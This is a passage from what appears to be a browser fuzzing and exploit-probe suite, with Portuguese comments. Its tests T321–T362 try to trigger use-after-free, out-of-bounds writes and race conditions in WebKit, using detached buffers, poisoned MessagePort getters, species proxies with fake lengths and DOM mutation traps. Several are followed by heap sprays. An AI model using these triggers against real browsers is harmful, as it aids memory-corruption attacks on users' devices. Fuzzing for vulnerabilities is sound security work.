        Array.prototype.sort.call(ia, function(a, b) {
            if (!transferred) {
                // Transfere o buffer para o worker no meio da ordenação
                // O WebKit deve impedir acesso subsequente, mas implementações antigas falham
                w.postMessage(ab, [ab]);
                transferred = true;
            }
            return a - b;
        });
    } catch(e) {
        log(">> T321 Caught: " + e.message);
    }
    
    // Spray imediato para tentar ocupar a memória do buffer se houve UAF
    var spray = new Uint32Array(1024 * 256).fill(0x12345678);
    w.terminate();
}

function runTest322() {
    log("Iniciando T322: RegExp Exec String Flatten Trap...");
    // Tenta forçar a "reorganização" (flattening) de strings roped durante execução de regex
    var s1 = "part1".repeat(1000);
    var s2 = "part2".repeat(1000);
    var s = s1 + s2; // Cons string (rope)
    
    var re = /p/g;
    re.lastIndex = 1000;
    
    // Define um getter que invalida a string original ou força GC
    var o = {
        toString: function() {
            s = null; // Remove referência
            var junk = new Array(10000).fill("JUNK"); // GC pressure
            return "part1";
        }
    };
    
    try {
        // Tenta confundir o motor passando objeto com toString customizado
        re.exec(o); 
        // Acesso à string original que pode ter sido movida/coletada
        var sub = s.substring(0, 10);
    } catch(e) {}
    
    log(">> T322: String rope logic executed.");
}

function runTest323() {
    log("Iniciando T323: TypedArray Constructor Proxy Loop...");
    // Cria um Proxy que retorna a si mesmo como construtor
    var p = new Proxy(Uint8Array, {
        get: function(target, prop) {
            if (prop === Symbol.species) return p;
            return target[prop];
        },
        construct: function(target, args) {
            // Retorna um objeto malformado fingindo ser TypedArray
            return {
                buffer: new ArrayBuffer(100),
                byteOffset: 0,
                byteLength: 0xFFFFFFFF, // Length inválido
                length: 0xFFFFFFFF
            };
        }
    });

    try {
        // Tenta enganar o método .from ou .of para escrever fora dos limites
        // assumindo que o objeto retornado é seguro
        var arr = Uint8Array.from.call(p, [1, 2, 3, 4]);
        log(">> T323: Proxy constructor passed (Warning).");
    } catch(e) {
        log(">> T323 Caught: " + e.message);
    }
}

function runTest324() {
    log("Iniciando T324: JSON Parse Reviver DOM Mutation...");
    var json = '{"a": 1, "b": {"c": 2}}';
    var div = document.createElement('div');
    document.body.appendChild(div);
    
    try {
        JSON.parse(json, function(key, value) {
            if (key === 'c') {
                // Modifica o DOM drasticamente durante o parsing
                div.innerHTML = "<span>replaced</span>".repeat(1000);
                // Remove o elemento pai
                if(div.parentNode) div.parentNode.removeChild(div);
                // Tenta forçar layout síncrono
                var h = document.body.offsetHeight;
                // Aloca memória
                var x = new ArrayBuffer(1024*1024);
            }
            return value;
        });
    } catch(e) {
        log(">> T324 Error: " + e.message);
    }
    
    if(document.body.contains(div)) document.body.removeChild(div);
}

function runTest325() {
    log("Iniciando T325: Large String Concat OOM Trigger...");
    var chunks = [];
    var base = "A".repeat(1024*1024); // 1MB
    
    try {
        // Tenta criar uma string maior que o limite máximo (geralmente ~256MB ou ~1GB)
        // Mas faz isso de forma fragmentada para estressar o alocador de heaps grandes
        for(var i=0; i<1000; i++) {
            chunks.push(base);
            // Tenta forçar concatenação parcial
            var s = chunks.join("");
            if (s.length > 1024*1024*100) { // 100MB
                 chunks = [s]; // Consolida
            }
        }
    } catch(e) {
        log(">> T325 OOM Caught (Expected): " + e.message);
        // Imediatamente após falha de memória, tenta usar APIs do Kernel
        // O Kernel pode estar instável devido à pressão de memória
        var b = new Blob(["test"]);
        var u = URL.createObjectURL(b);
    }
}

function runTest326() {
    log("Iniciando T326: Blob URL Video Source Reload Spam...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    var data = new Uint8Array(1024*1024).fill(0);
    
    var t = setInterval(function() {
        var b = new Blob([data]);
        var u = URL.createObjectURL(b);
        v.src = u;
        
        // Força load e remove source imediatamente
        v.load();
        URL.revokeObjectURL(u);
        
        // Adiciona e remove track para complexidade
        var track = v.addTextTrack("subtitles");
        track.mode = "showing";
        
    }, 20); // 50Hz spam
    
    setTimeout(function() {
        clearInterval(t);
        document.body.removeChild(v);
        log(">> T326: Video/Blob resource spam done.");
    }, 3000);
}

function runTest327() {
    log("Iniciando T327: IndexedDB Transaction Worker Kill...");
    var dbName = "kill_" + Date.now();
    var req = indexedDB.open(dbName, 1);
    
    req.onupgradeneeded = function(e) {
        e.target.result.createObjectStore("s");
    };
    
    req.onsuccess = function(e) {
        var db = e.target.result;
        var code = `
            self.onmessage = function(e) {
                // Tenta manter transação ativa
                postMessage("ack");
            }
        `;
        var b = new Blob([code], {type:'js'});
        
        var t = setInterval(function() {
            var w = new Worker(URL.createObjectURL(b));
            
            // Inicia transação na main thread
            var tx = db.transaction("s", "readwrite");
            tx.objectStore("s").put(Math.random(), "k");
            
            w.postMessage("ping");
            
            // Mata worker enquanto transação do DB está commitando
            w.terminate();
            
        }, 10);
        
        setTimeout(function() {
            clearInterval(t);
            db.close();
            indexedDB.deleteDatabase(dbName);
            log(">> T327: IDB/Worker kill loop done.");
        }, 3000);
    };
}

function runTest328() {
    log("Iniciando T328: Canvas Pattern Video Source Race...");
    var v = document.createElement('video');
    // Usa blob inválido para manter estado de "loading" ou "error"
    v.src = URL.createObjectURL(new Blob(["junk"]));
    
    var c = document.createElement('canvas');
    var ctx = c.getContext('2d');
    
    var t = setInterval(function() {
        try {
            // Tenta criar padrão de um vídeo em estado instável
            var p = ctx.createPattern(v, 'repeat');
            ctx.fillStyle = p;
            ctx.fillRect(0,0,100,100);
        } catch(e) {}
        
        // Modifica estado do vídeo
        if (Math.random() > 0.5) v.width = 100; else v.width = 200;
        
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T328: Canvas/Video pattern race done.");
    }, 3000);
}

function runTest329() {
    log("Iniciando T329: XHR Sync Blob Revocation Deadlock...");
    var data = new Uint8Array(1024*1024*2).fill(65);
    var b = new Blob([data]);
    var u = URL.createObjectURL(b);
    
    // Tenta criar uma condição onde a leitura síncrona bloqueia a revogação
    // ou a revogação invalida o descritor sendo lido
    
    setTimeout(function() {
        URL.revokeObjectURL(u);
        log(".. Revoked");
    }, 100); // Tenta revogar no meio da leitura (se o browser permitir concorrência interna)
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", u, false); // SYNC
        xhr.send();
        log(">> T329: Sync read finished (Size: " + xhr.response.length + ")");
    } catch(e) {
        log(">> T329 Error: " + e.message);
    }
}

function runTest330() {
    log("Iniciando T330: THE KERNEL FRACTURE (COMBO)...");
    
    // 1. Worker Buffer Detach
    var ab = new ArrayBuffer(1024*1024);
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    
    // 2. Video Source Thrashing
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    var i = 0;
    var t = setInterval(function() {
        i++;
        
        // Transfer Buffer
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // Video Blob Cycle
        var b = new Blob([new Uint8Array(1024).fill(i)]);
        var u = URL.createObjectURL(b);
        v.src = u;
        
        if(i % 5 === 0) URL.revokeObjectURL(u);
        
        // Request/Exit FS
        if(i % 10 === 0) exitFS();
        if(i % 10 === 5) reqFS(v);
        
    }, 25);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        if(document.body.contains(v)) document.body.removeChild(v);
        log(">> T330: Fracture event finished.");
    }, 4000);
}
function runTest331() {
    log("Iniciando T331: Proxy Getter Message Port UAF...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    
    // Objeto proxy que fecha a porta quando ela é acessada para transferência
    var payload = new Proxy({}, {
        get: function(target, prop) {
            if (prop === 'port') {
                p1.close(); // Fecha a porta imediatamente antes do envio
                return p1;
            }
            return target[prop];
        }
    });

    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    try {
        // Tenta enviar a porta que é fechada durante a leitura da propriedade
        // O WebKit tenta serializar um objeto que acabou de ser invalidado
        w.postMessage({ p: payload.port }, [p1]);
        
        // Heap spray imediato para ocupar a memória da porta
        var spray = new Uint32Array(1000).fill(0xDEADBEEF);
    } catch(e) {
        log(">> T331 Caught: " + e.message);
    }
    setTimeout(() => w.terminate(), 2000);
}

function runTest332() {
    log("Iniciando T332: Map Iterator Invalidation Race...");
    var m = new Map();
    for(var i=0; i<1000; i++) m.set(i, {data: new ArrayBuffer(64)});
    
    var it = m.entries();
    var count = 0;
    
    // Itera manualmente
    var next = it.next();
    while(!next.done) {
        count++;
        // Modifica o Map drasticamente durante a iteração
        if(count % 100 === 0) {
            // Remove e adiciona chaves para forçar rehash/redimensionamento da tabela
            for(var j=0; j<200; j++) m.delete(count + j);
            for(var k=0; k<100; k++) m.set("new"+k, new Uint8Array(100));
            
            // Tenta confundir o ponteiro interno do iterador
            m.clear(); 
        }
        
        try {
            next = it.next(); // Acesso a iterador invalidado?
        } catch(e) {
            log(">> T332 Map Error: " + e.message);
            break;
        }
    }
    log(">> T332: Map iteration stress done.");
}

function runTest333() {
    log("Iniciando T333: Text Node Normalize Split Trap...");
    var div = document.createElement('div');
    var t1 = document.createTextNode("A".repeat(1000));
    var t2 = document.createTextNode("B".repeat(1000));
    div.appendChild(t1);
    div.appendChild(t2);
    document.body.appendChild(div);
    
    var ranges = [];
    for(var i=0; i<100; i++) {
        var r = document.createRange();
        r.setStart(t1, i*10);
        r.setEnd(t2, i*10);
        ranges.push(r);
    }
    
    // Normaliza (funde t1 e t2)
    div.normalize();
    
    // Divide novamente (cria novos nós)
    // Os Ranges antigos podem apontar para nós liberados ou offsets inválidos
    try {
        div.firstChild.splitText(500);
        
        // Acessa ranges antigos
        ranges.forEach(r => {
            var x = r.toString(); // Trigger
        });
    } catch(e) {
        log(">> T333 Logic: " + e.message);
    }
    
    document.body.removeChild(div);
}

function runTest334() {
    log("Iniciando T334: XHR Response Type Switching Bug...");
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "/", true);
    
    xhr.onreadystatechange = function() {
        if(xhr.readyState === 3) { // LOADING
            // Tenta mudar o tipo de resposta enquanto os dados estão chegando
            // Isso força o motor a converter buffer parcial -> string -> blob
            try {
                xhr.responseType = "blob";
                var r = xhr.response; // Acesso prematuro
                xhr.responseType = "arraybuffer";
                var r2 = xhr.response;
                
                // Aborta no meio da conversão
                xhr.abort();
            } catch(e) {}
        }
    };
    xhr.send();
    log(">> T334: XHR Type switching triggered.");
}

function runTest335() {
    log("Iniciando T335: Deep Iframe Removal Recursion...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    function build(depth, parent) {
        if(depth > 50) return;
        var f = document.createElement('iframe');
        parent.appendChild(f);
        f.srcdoc = "<html><body></body></html>";
        f.onload = function() {
            build(depth + 1, f.contentDocument.body);
            if(depth === 20) {
                // Remove um nó intermediário da cadeia
                // Causa destruição em cascata enquanto callbacks onload ainda estão na pilha
                container.innerHTML = "";
                var spray = new Array(10000).fill(1);
            }
        };
    }
    
    build(0, container);
    setTimeout(() => {
        if(document.body.contains(container)) document.body.removeChild(container);
        log(">> T335: Recursive frame removal done.");
    }, 2000);
}

function runTest336() {
    log("Iniciando T336: Recursive Blob Slice Kernel Stack...");
    var base = new Blob(["A".repeat(1024)]);
    var curr = base;
    
    // Cria uma cadeia profunda de blobs fatiados
    // Cada slice cria uma referência que aponta para o blob pai
    // Tenta estourar o stack do kernel ao resolver a leitura
    try {
        for(var i=0; i<2000; i++) {
            curr = curr.slice(1, curr.size);
        }
        
        // Trigger de leitura
        var fr = new FileReader();
        fr.readAsText(curr);
        
        log(">> T336: Blob slice depth 2000 created.");
    } catch(e) {
        log(">> T336 Stack/Memory Limit: " + e.message);
    }
}

function runTest337() {
    log("Iniciando T337: LocalStorage Key Collision Stress...");
    var keys = [];
    try {
        // Gera chaves que podem causar colisão de hash
        for(var i=0; i<1000; i++) {
            var k = "k" + i + "x".repeat(i % 10);
            keys.push(k);
            localStorage.setItem(k, "v".repeat(100));
        }
        
        // Remove e re-adiciona rapidamente para fragmentar o arquivo de banco de dados
        for(var j=0; j<5000; j++) {
            var t = keys[Math.floor(Math.random() * keys.length)];
            localStorage.removeItem(t);
            localStorage.setItem(t, "new_val");
            
            if(j % 1000 === 0) localStorage.clear();
        }
    } catch(e) {
        log(">> T337 IO Error: " + e.message);
    }
    localStorage.clear();
}

function runTest338() {
    log("Iniciando T338: Canvas Pattern Video Error Race...");
    var v = document.createElement('video');
    // Fonte inválida para causar erro
    v.src = "http://invalid.local/" + Math.random();
    
    var c = document.createElement('canvas');
    var ctx = c.getContext('2d');
    
    v.onerror = function() {
        // Tenta criar padrão de um vídeo em estado de erro
        try {
            var p = ctx.createPattern(v, 'repeat');
            ctx.fillStyle = p;
            ctx.fillRect(0,0,100,100);
        } catch(e) {}
        
        // Remove vídeo do DOM
        if(v.parentNode) v.parentNode.removeChild(v);
        // Tenta acessar novamente
        v.src = "";
    };
    
    document.body.appendChild(v);
    log(">> T338: Video error pattern logic.");
}

function runTest339() {
    log("Iniciando T339: History Huge State Reload Loop...");
    // Cria um objeto de estado muito grande
    var huge = { data: new Array(50000).fill("HISTORY_LEAK") };
    
    try {
        history.replaceState(huge, "Heavy", "/heavy");
        
        // Tenta recarregar a página. O browser deve serializar o estado para restaurar após reload.
        // Se o objeto for muito grande, pode falhar ou corromper o buffer de IPC.
        // Simulamos o reload com um iframe para não matar a página de teste
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        f.contentWindow.history.replaceState(huge, "HeavyFrame", "/frame");
        f.contentWindow.location.reload();
        
        setTimeout(() => document.body.removeChild(f), 1000);
    } catch(e) {
        log(">> T339 State Error: " + e.message);
    }
}

function runTest340() {
    log("Iniciando T340: THE DESYNC STORM (COMBO)...");
    
    // 1. Worker Buffer Detach Race
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    
    // 2. Fullscreen Toggle
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    // 3. Iframe Mutation
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    var t = setInterval(function() {
        // Transfer
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // Toggle FS
        if(Math.random() > 0.7) exitFS();
        else reqFS(el);
        
        // Iframe Destroy/Create
        f.src = "about:blank";
        f.contentDocument.write("<h1>" + Math.random() + "</h1>");
        
    }, 40);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        document.body.removeChild(el);
        document.body.removeChild(f);
        log(">> T340: Storm passed.");
    }, 4000);
}
function runTest341() {
    log("Iniciando T341: Message Port Transfer Getter Poison...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    var poison = {
        get port() {
            // Getter malicioso executado durante a serialização da mensagem
            // Fecha a porta que está prestes a ser transferida
            p1.close();
            // Heap spray para preencher a estrutura da porta liberada
            var spray = new Uint32Array(0x100).fill(0xDEADBEEF);
            return p1;
        }
    };

    try {
        // Envia objeto contendo o getter e a porta na lista de transferência
        // O WebKit pode validar a porta antes da serialização, mas o getter roda durante
        w.postMessage({ target: poison.port }, [p1]);
    } catch(e) {
        log(">> T341 Blocked/Caught: " + e.message);
    }
    setTimeout(() => w.terminate(), 1000);
}

function runTest342() {
    log("Iniciando T342: TypedArray Species Constructor Proxy...");
    // Proxy para interceptar a criação de novos TypedArrays via métodos como .map ou .filter
    var p = new Proxy(Uint8Array, {
        get: function(target, prop) {
            if (prop === Symbol.species) return function() {
                // Retorna um objeto com comprimento massivo mas buffer pequeno
                return { 
                    buffer: new ArrayBuffer(8), 
                    byteOffset: 0, 
                    length: 0xFFFFFFFF,
                    set: function() {} 
                };
            };
            return target[prop];
        }
    });

    try {
        var a = new Uint8Array([1, 2, 3]);
        // Força o uso do construtor Species
        Object.setPrototypeOf(a, p.prototype);
        a.constructor = p;
        
        // Operação que cria nova instância
        var res = a.map(x => x * 2);
        log(">> T342: Map executed.");
    } catch(e) {
        log(">> T342 Error: " + e.message);
    }
}

function runTest343() {
    log("Iniciando T343: DOM Node Inserted Mutation Trap...");
    var d = document.createElement('div');
    document.body.appendChild(d);
    var span = document.createElement('span');
    
    // Evento síncrono antigo (se suportado) ou MutationObserver microtask
    d.addEventListener('DOMNodeInserted', function(e) {
        // Durante a inserção, removemos o elemento pai e manipulamos o nó inserido
        // Tenta corromper a cadeia de ponteiros do DOM
        document.body.removeChild(d);
        span.innerHTML = "<a><b><c></c></b></a>".repeat(100);
        // Acesso a propriedades de layout em árvore desconectada e mutada
        var h = span.offsetHeight; 
        var spray = new Array(1000).fill(1.1);
    });

    try {
        d.appendChild(span);
    } catch(e) {}
    
    setTimeout(() => {
        if(document.body.contains(d)) document.body.removeChild(d);
        log(">> T343: Mutation trap finished.");
    }, 1000);
}

function runTest344() {
    log("Iniciando T344: RegExp Exec String Rope Flattening...");
    var s1 = "part1".repeat(1000);
    var s2 = "part2".repeat(1000);
    var rope = s1 + s2; // Cria uma string "rope" (concatenada logicamente)
    
    var re = /p/g;
    re.lastIndex = 2000;
    
    var o = {
        toString: function() {
            // Invalida a referência original e força GC
            rope = null;
            var junk = new Uint8Array(1024*1024*10); // Pressão de memória
            return "part1";
        }
    };
    
    try {
        // Passa objeto customizado para exec
        // O motor tenta converter para string, achatando a rope, mas o GC roda no meio
        re.exec(o);
    } catch(e) {}
    
    log(">> T344: String rope stress.");
}

function runTest345() {
    log("Iniciando T345: History State JSON Recursion Bomb...");
    var a = [];
    var b = [a];
    a.push(b); // Referência circular simples
    
    // JSON.stringify falha em ciclos, mas a serialização do History usa "Structured Clone"
    // que suporta ciclos, mas tem limites de recursão.
    // Criamos um grafo extremamente profundo para estourar o stack de serialização do kernel
    var root = {};
    var curr = root;
    for(var i=0; i<5000; i++) {
        curr.next = {};
        curr = curr.next;
    }
    
    try {
        history.pushState(root, "Bomb", "/bomb");
        // Força navegação imediata para serializar
        history.go(0);
    } catch(e) {
        log(">> T345 Stack/State Error: " + e.message);
    }
}

function runTest346() {
    log("Iniciando T346: Crypto Syscall Worker Termination...");
    if(!window.crypto) { log("T346: No Crypto"); return; }
    
    var code = `
        self.onmessage = function() {
            var b = new Uint8Array(1024*1024*2); // 2MB
            // Chamada de sistema que deve bloquear
            crypto.getRandomValues(b);
            postMessage(b, [b.buffer]);
        }
    `;
    var b = new Blob([code], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        w.postMessage("go");
        // Mata o worker muito rápido, tentando interromper a escrita do kernel na memória userland
        setTimeout(() => w.terminate(), 2);
        
        // Realoca memória na main thread
        var spray = new Uint32Array(1024*256).fill(0xCAFEBABE);
    }, 20);

    setTimeout(function() {
        clearInterval(t);
        log(">> T346: Crypto race stopped.");
    }, 3000);
}

function runTest347() {
    log("Iniciando T347: IndexedDB Upgrade Transaction Abort...");
    var name = "db_" + Date.now();
    var req = indexedDB.open(name, 1);
    
    req.onupgradeneeded = function(e) {
        var db = e.target.result;
        var store = db.createObjectStore("store");
        
        // Popula massivamente durante o upgrade
        for(var i=0; i<500; i++) store.put(new Uint8Array(1024).fill(i), i);
        
        // Aborta a transação implicitamente fechando o DB ou lançando erro
        e.target.transaction.abort();
        db.close();
        
        // Tenta reabrir imediatamente
        setTimeout(() => {
            indexedDB.open(name, 2);
        }, 10);
    };
    
    req.onerror = function() { log(".. DB Error (Expected)"); };
    log(">> T347: IDB Transaction abort race.");
}

function runTest348() {
    log("Iniciando T348: Fullscreen Video Track Cue Race...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    var t = v.addTextTrack("subtitles");
    t.mode = "showing";
    reqFS(v);
    
    var i = 0;
    var interval = setInterval(function() {
        i++;
        // Adiciona e remove Cues rapidamente
        // O renderizador de legendas roda em overlay sobre o vídeo FS
        var cue = new VTTCue(i, i+1, "TEXT " + i);
        t.addCue(cue);
        if(t.cues.length > 50) {
            // Remove aleatoriamente
            t.removeCue(t.cues[Math.floor(Math.random() * t.cues.length)]);
        }
        
        // Modifica estilo do vídeo para forçar recomposição
        v.style.outline = (i%2) + "px solid red";
        
        if(i > 100) {
            clearInterval(interval);
            exitFS();
            document.body.removeChild(v);
            log(">> T348: Track race done.");
        }
    }, 30);
}

function runTest349() {
    log("Iniciando T349: Canvas putImageData Detached Buffer...");
    var c = document.createElement('canvas');
    c.width=100; c.height=100;
    var ctx = c.getContext('2d');
    
    var ab = new ArrayBuffer(100*100*4);
    var u8 = new Uint8ClampedArray(ab);
    var data = new ImageData(u8, 100, 100);
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage('k');}"],{type:'js'})));
    
    try {
        // Transfere o buffer que sustenta o ImageData para o worker
        w.postMessage(ab, [ab]);
        
        // Tenta usar o ImageData com buffer neuterizado no Canvas
        // O ponteiro interno de dados agora é inválido/nulo
        ctx.putImageData(data, 0, 0);
        
        log(">> T349: putImageData passed (Check for crash).");
    } catch(e) {
        log(">> T349 Blocked: " + e.message);
    }
    w.terminate();
}

function runTest350() {
    log("Iniciando T350: THE ENTANGLEMENT (COMBO)...");
    
    // 1. Worker Message Loop
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    
    // 2. Fullscreen Video
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    // 3. History Thrashing
    var hInt = setInterval(() => {
        try { history.replaceState({}, "t", "/"+Date.now()); } catch(e){}
    }, 50);
    
    var t = setInterval(function() {
        // IPC Race
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // DOM Mutation
        var d = document.createElement('div');
        v.appendChild(d);
        v.removeChild(d);
        
        // Exit/Enter FS random
        if(Math.random() > 0.8) { exitFS(); setTimeout(()=>reqFS(v), 10); }
        
    }, 25);
    
    setTimeout(function() {
        clearInterval(t);
        clearInterval(hInt);
        w.terminate();
        exitFS();
        document.body.removeChild(v);
        log(">> T350: Entanglement sequence finished.");
    }, 4000);
}
function runTest351() {
    log("Iniciando T351: Proxy Revoke Worker Transfer Trap...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var revocable = Proxy.revocable(p1, {
        get: function(target, prop) {
            return target[prop];
        }
    });
    var proxy = revocable.proxy;
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    try {
        revocable.revoke();
        w.postMessage({ port: proxy }, [proxy]);
    } catch(e) {
        log(">> T351 Blocked/Caught: " + e.message);
    }
    
    var spray = new Uint32Array(1000).fill(0xDEADBEEF);
    setTimeout(() => w.terminate(), 1000);
}

function runTest352() {
    log("Iniciando T352: DOM Node Iterator Filter Detach...");
    var root = document.createElement('div');
    root.innerHTML = "<div><span>A</span><b>B</b></div>".repeat(100);
    document.body.appendChild(root);
    
    var ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node.tagName === 'B') {
                var range = document.createRange();
                range.selectNode(node);
                range.deleteContents(); 
                var s = document.createElement('div');
                s.textContent = "SPRAY";
                root.appendChild(s);
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    });
    
    try {
        while(ni.nextNode()) {}
    } catch(e) {}
    
    setTimeout(function() {
        if(document.body.contains(root)) document.body.removeChild(root);
        log(">> T352: Iterator detach trap.");
    }, 1000);
}

function runTest353() {
    log("Iniciando T353: RegExp Compiled Code Cache Flush...");
    var re = /abc/g;
    var s = "abc".repeat(10000);
    
    var t = setInterval(function() {
        re.exec(s);
        
        // Força recompilação/flush do cache de regex alterando flags ou source indiretamente
        // ou criando pressão de memória JIT (se existisse)
        // Aqui usamos a criação massiva de regex similares para poluir o cache
        for(var i=0; i<100; i++) {
            var r = new RegExp("abc" + i, "g");
            r.test("abc" + i);
        }
        
        re.lastIndex = 0;
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T353: Regex cache stress.");
    }, 2000);
}

function runTest354() {
    log("Iniciando T354: TypedArray Subclass Constructor Loop...");
    class MyArray extends Uint8Array {
        static get [Symbol.species]() {
            return function() {
                // Retorna buffer desconectado ou tamanho incorreto
                return new Uint8Array(new ArrayBuffer(0));
            }
        }
    }
    
    var a = new MyArray(100);
    try {
        // Métodos que usam Species para criar nova instância
        var b = a.map(v => v + 1);
        b[0] = 255; // Escrita em buffer de tamanho 0?
        log(">> T354: Subclass logic executed.");
    } catch(e) {
        log(">> T354 Error: " + e.message);
    }
}

function runTest355() {
    log("Iniciando T355: History State Recursive JSON Getter...");
    var depth = 0;
    var obj = {
        get val() {
            depth++;
            if(depth < 1000) return { child: this.val }; 
            return "leaf";
        }
    };
    
    try {
        history.pushState(obj, "Recursive", "/rec");
    } catch(e) {
        log(">> T355 Stack/Serialize Error: " + e.message);
    }
}

function runTest356() {
    log("Iniciando T356: Crypto Random Buffer View Detach...");
    if(!window.crypto) { log("N/A"); return; }
    
    var ab = new ArrayBuffer(1024*1024);
    var view = new Uint8Array(ab);
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage('k');}"],{type:'js'})));
    
    try {
        // Inicia operação crypto
        crypto.getRandomValues(view);
        
        // Transfere buffer imediatamente
        w.postMessage(ab, [ab]);
        
        // Se a operação crypto não for atômica em relação ao neutering, 
        // o kernel pode escrever em memória já liberada/transferida
    } catch(e) {}
    
    w.terminate();
    log(">> T356: Crypto/Transfer race.");
}

function runTest357() {
    log("Iniciando T357: IndexedDB Cursor Continue Remove...");
    var dbName = "cursor_" + Date.now();
    var req = indexedDB.open(dbName, 1);
    
    req.onupgradeneeded = function(e) {
        var db = e.target.result;
        var s = db.createObjectStore("s", {autoIncrement:true});
        for(var i=0; i<500; i++) s.add("data"+i);
    };
    
    req.onsuccess = function(e) {
        var db = e.target.result;
        var tx = db.transaction("s", "readwrite");
        var store = tx.objectStore("s");
        var req = store.openCursor();
        
        req.onsuccess = function(ev) {
            var cursor = ev.target.result;
            if(cursor) {
                // Remove o item atual enquanto itera
                cursor.delete();
                // Modifica o DB externamente
                store.add("noise");
                cursor.continue();
            }
        };
        
        setTimeout(() => { db.close(); indexedDB.deleteDatabase(dbName); }, 2000);
        log(">> T357: IDB Cursor logic.");
    };
}

function runTest358() {
    log("Iniciando T358: Canvas toBlob Revoke Worker Race...");
    var c = document.createElement('canvas');
    c.width = 2000; c.height = 2000;
    var ctx = c.getContext('2d');
    ctx.fillRect(0,0,2000,2000);
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(u){var x=new XMLHttpRequest();x.open('GET',u,false);x.send();}"],{type:'js'})));
    
    var t = setInterval(function() {
        c.toBlob(function(blob) {
            var u = URL.createObjectURL(blob);
            w.postMessage(u);
            // Revoga imediatamente
            URL.revokeObjectURL(u);
        });
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T358: Canvas blob race.");
    }, 3000);
}

function runTest359() {
    log("Iniciando T359: Storage Event Cross-Window Flood...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    window.onstorage = function(e) {
        // Callback recursivo indireto
        localStorage.setItem("echo", Math.random());
    };
    
    var t = setInterval(function() {
        localStorage.setItem("flood", "X".repeat(1024));
        f.contentWindow.localStorage.setItem("flood", "Y".repeat(1024));
        localStorage.removeItem("flood");
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        window.onstorage = null;
        if(document.body.contains(f)) document.body.removeChild(f);
        localStorage.clear();
        log(">> T359: Storage event flood.");
    }, 3000);
}

function runTest360() {
    log("Iniciando T360: THE EVENT HORIZON (FINAL COMBO)...");
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){try{postMessage(e.data,[e.data]);}catch(z){}}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    var i = 0;
    var t = setInterval(function() {
        i++;
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        if(i%5===0) {
            var f = document.createElement('iframe');
            document.body.appendChild(f);
            f.contentWindow.history.pushState({}, "x", "/x");
            document.body.removeChild(f);
        }
        
        if(i%4===0) { if(Math.random()>0.5) exitFS(); else reqFS(el); }
        
        localStorage.setItem("k", i);
    }, 30);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        localStorage.clear();
        log(">> T360: Horizon reached. Suite complete.");
    }, 5000);
}
function runTest361() {
    log("Iniciando T361: TypedArray Reflect Construct Trap...");
    // Tenta enganar o alocador interno usando Reflect.construct com um protótipo proxy
    // O objetivo é criar uma view tipada que aponta para memória não inicializada ou menor que o reportado
    var P = new Proxy(Uint8Array, {
        construct: function(target, args, newTarget) {
            var obj = Reflect.construct(target, args, newTarget);
            // Retorna um objeto que não é exatamente o que o motor espera
            return new Proxy(obj, {
                get: function(t, p) {
                    if (p === 'byteLength') return 0xFFFFFFF0; // Length falso
                    return Reflect.get(t, p);
                }
            });
        }
    });

    try {
        // Aloca buffer pequeno, mas o proxy diz que é gigante
        var arr = new P(16);
        // Tenta operação de cópia nativa (set) que confia no byteLength
        var src = new Uint8Array(1024).fill(0xAA);
        arr.set(src); // Buffer overflow no heap do JS?
        log(">> T361: Reflect logic executed.");
    } catch(e) {
        log(">> T361 Error: " + e.message);
    }
}

function runTest362() {
    log("Iniciando T362: Message Channel Transfer Getter Poison...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    
    // Cria um objeto que fecha a porta quando o serializador tenta ler a propriedade 'transfer'
    var poison = {
